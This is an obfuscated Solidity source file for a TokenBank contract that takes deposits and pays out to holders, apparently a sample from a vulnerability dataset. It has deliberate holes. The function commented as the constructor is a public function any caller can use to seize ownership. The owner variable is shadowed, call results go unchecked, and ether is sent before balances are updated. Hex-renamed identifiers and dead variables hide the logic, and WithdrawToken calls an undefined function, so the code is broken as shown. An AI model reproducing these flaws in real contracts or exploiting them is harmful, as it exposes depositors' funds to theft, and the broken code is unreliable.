// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0x2c62d2;
    address _0x6e9d31 = msg.sender;

    function _0x94131c(address _0x3a72d0)
    public
    _0xc005cd
    {
        // Placeholder for future logic
        uint256 _unused2 = 0;
        _0x2c62d2 = _0x3a72d0;
    }

    function _0xb29609()
    public
    {
        bool _flag3 = false;
        bool _flag4 = false;
        if(msg.sender==_0x2c62d2)
        {
            _0x6e9d31=_0x2c62d2;
        }
    }

    modifier _0xc005cd
    {
        if(_0x6e9d31 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x6e9d31 = msg.sender;
    function WithdrawToken(address _0xe5db3c, uint256 _0x64a4ae,address _0xc933f9)
    public
    _0xc005cd
    {
        _0xe5db3c.call(bytes4(_0x2be6f6("transfer(address,uint256)")),_0xc933f9,_0x64a4ae);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x3ecd1f()
    public
    {
        _0x6e9d31 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x6bfa24,address _0xbfb848,uint _0x4c5970)
    public
    _0xc005cd
    {
        if(Holders[_0x6bfa24]>0)
        {
            Holders[_0x6bfa24]=0;
            WithdrawToken(_0xbfb848,_0x4c5970,_0x6bfa24);
        }
    }

    function WithdrawToHolder(address _0xf939f4, uint _0x1819b5)
    public
    _0xc005cd
    payable
    {
        if(Holders[_0xf939f4]>0)
        {
            if(_0xf939f4.call.value(_0x1819b5)())
            {
                Holders[_0xf939f4]-=_0x1819b5;
            }
        }
    }
}